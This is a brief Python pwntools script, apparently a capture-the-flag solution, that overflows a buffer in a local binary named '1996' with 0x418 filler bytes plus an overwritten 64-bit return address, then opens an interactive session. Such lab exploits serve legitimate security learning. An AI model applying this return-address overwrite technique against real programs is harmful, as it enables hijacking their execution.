from pwn import *

payload = b"A" * 0x418 + p64(0x400897)

io = process("./1996")

io.send(payload)
io.interactive()
